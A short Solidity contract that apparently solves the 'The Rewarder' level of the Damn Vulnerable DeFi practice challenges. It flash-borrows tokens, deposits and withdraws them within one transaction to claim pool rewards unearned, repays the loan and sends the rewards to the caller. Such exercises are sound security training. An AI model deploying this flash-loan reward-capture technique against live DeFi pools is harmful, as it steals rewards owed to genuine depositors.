// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";

contract RewarderAttacker {
    FlashLoanerPool flashLoanerPool;
    TheRewarderPool theRewarderPool;
    DamnValuableToken liquidityToken;
    RewardToken rewardToken;

    constructor(
        FlashLoanerPool _flashLoanerPool,
        TheRewarderPool _theRewarderPool,
        DamnValuableToken _liquidityToken,
        RewardToken _rewardToken
    ) {
        flashLoanerPool = _flashLoanerPool;
        theRewarderPool = _theRewarderPool;
        liquidityToken = _liquidityToken;
        rewardToken = _rewardToken;
    }

    function takeLoanAndAttack(uint256 amount) external {
        flashLoanerPool.flashLoan(amount);
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) public {
        liquidityToken.approve(address(theRewarderPool), amount);
        theRewarderPool.deposit(amount);
        theRewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanerPool), amount);
    }
}
